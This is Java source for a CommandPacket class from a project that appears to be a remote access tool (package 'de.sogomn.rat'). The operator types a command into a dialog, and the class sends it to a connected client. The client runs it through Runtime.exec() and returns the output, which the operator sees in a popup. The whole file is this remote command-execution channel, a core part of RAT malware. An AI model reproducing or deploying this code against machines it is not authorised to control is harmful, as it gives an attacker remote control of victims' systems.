package de.sogomn.rat.packet;

import java.io.IOException;
import java.io.InputStream;

import javax.swing.JDialog;
import javax.swing.JOptionPane;

import de.sogomn.rat.ActiveClient;

public final class CommandPacket extends AbstractPingPongPacket {
	
	private String command;
	private String output;
	
	public CommandPacket(final String command) {
		this.command = command;
		
		type = REQUEST;
	}
	
	public CommandPacket() {
		this("");
		
		type = DATA;
	}
	
	@Override
	protected void sendRequest(final ActiveClient client) {
		client.writeUTF(command);
	}
	
	@Override
	protected void sendData(final ActiveClient client) {
		client.writeUTF(output);
	}
	
	@Override
	protected void receiveRequest(final ActiveClient client) {
		command = client.readUTF();
	}
	
	@Override
	protected void receiveData(final ActiveClient client) {
		output = client.readUTF();
	}
	
	@Override
	protected void executeRequest(final ActiveClient client) {
		try {
			final Process process = Runtime.getRuntime().exec(command);
			
			process.waitFor();
			
			final InputStream in = process.getInputStream();
			final byte[] buffer = new byte[in.available()];
			
			in.read(buffer);
			
			output = new String(buffer);
		} catch (final IOException | InterruptedException ex) {
			output = ex.toString();
		}
		
		type = DATA;
		client.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveClient client) {
		final JOptionPane optionPane = new JOptionPane(output);
		final JDialog dialog = optionPane.createDialog(null);
		
		dialog.setModal(false);
		dialog.setVisible(true);
	}
	
	public String getCommand() {
		return command;
	}
	
	public String getOutput() {
		return output;
	}
	
	public static CommandPacket create() {
		final String input = JOptionPane.showInputDialog(null);
		
		if (input != null) {
			final CommandPacket packet = new CommandPacket(input);
			
			return packet;
		} else {
			return null;
		}
	}
	
}
